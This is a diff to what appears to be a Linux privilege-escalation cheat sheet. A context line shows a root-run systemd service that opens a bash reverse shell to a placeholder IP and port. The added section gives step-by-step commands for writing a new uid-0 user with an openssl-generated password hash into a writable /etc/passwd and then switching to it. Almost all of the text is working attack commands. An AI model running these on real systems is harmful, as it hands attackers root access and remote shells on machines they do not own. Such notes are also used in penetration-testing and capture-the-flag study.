@@ -25,5 +25,25 @@ User=root
 ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
 ```
 
+## Modifying /etc/passwd with write access
 
+With a user that has write access to `/etc/passwd` file, we can add a new user credentials and gain root user access.
+
+* Generate a new password hash using the username as salt, here we are going to use `new` as a salt and `123` as our password.
+
+```bash
+openssl passwd -1 -salt new 123
+```
+
+* Next copy the hash generated, change the following entry and  enter it into the `/etc/passwd` file's end. Remember to change new with your selected username.
+
+```
+new:<hash>:0:0:root:/root:/bin/bash
+```
+
+* Now we use the following command and supply our password to gain root access.
+
+```bash
+su new   
+```
 
